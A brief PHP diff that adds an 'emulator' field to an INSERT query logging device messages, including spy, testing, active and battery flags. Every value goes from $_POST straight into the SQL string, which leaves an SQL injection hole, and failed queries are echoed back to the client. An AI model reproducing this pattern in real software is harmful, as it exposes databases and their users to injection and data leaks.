@@ -13,7 +13,8 @@ try {
         $testing = $_POST ["testing"] ;
         $active = $_POST ["active"] ;
         $battery = $_POST ["battery"] ;
-        $query = "INSERT INTO `MESSAGE`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery ) " ;
+        $emulator = $_POST ["emulator"] ;
+        $query = "INSERT INTO `MESSAGE`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
         mysqli_query ($connection, $query) or die ('request "Could not execute SQL query" '.$query);
         echo json_encode($response_success);
         exit();
